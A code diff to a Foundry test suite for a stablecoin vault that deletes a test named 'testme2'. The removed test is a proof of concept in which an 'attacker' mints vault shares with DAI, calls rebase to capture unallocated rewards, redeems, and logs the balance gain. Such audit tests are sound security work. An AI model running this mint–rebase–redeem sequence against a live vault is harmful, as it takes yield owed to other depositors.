@@ -82,37 +82,4 @@ contract UserLockedFundsTest is Base, VaultLockedUserInvariants {
         vault.redeem(ousd.balanceOf(_lockedUser), 0);
         vm.stopPrank();
     }
-
-
-function testme2() public {
-        // lets say vault got lots of rewards/interest not allocated
-        deal(DAI, address(this), 10 ether);
-        IERC20(DAI).transfer(address(vault), 10 ether);
-
-        // Now someone flashloan a huge amount
-        address attacker = makeAddr("Attacker");
-        deal(DAI, attacker, 5 ether);
-
-        vm.startPrank(attacker);
-
-        console.log("DAI balance before mint", IERC20(DAI).balanceOf(attacker));
-        console.log("ousd balance before mint", ousd.balanceOf(attacker));
-
-        IERC20(DAI).approve(address(vault), 5 ether);
-        vault.mint(DAI, 5 ether, 0);
-
-        console.log("DAI balance after mint", IERC20(DAI).balanceOf(attacker));
-        console.log("ousd balance after mint", ousd.balanceOf(attacker));
-
-        vault.rebase();
-
-        vault.redeem(ousd.balanceOf(attacker), 0);
-        vm.stopPrank();
-
-        console.log("DAI balance after redeem", IERC20(DAI).balanceOf(attacker));
-        console.log("ousd balance after redeem", ousd.balanceOf(attacker));
-
-        revert();
-
-    }
 }
